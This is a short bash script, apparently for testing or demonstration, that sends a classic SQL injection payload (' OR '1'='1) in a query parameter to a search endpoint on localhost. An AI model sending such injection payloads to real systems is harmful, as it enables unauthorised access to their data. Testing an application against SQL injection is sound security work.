#!/bin/bash
echo "Simulating SQL injection..."
curl "http://localhost:5000/search?q=' OR '1'='1"
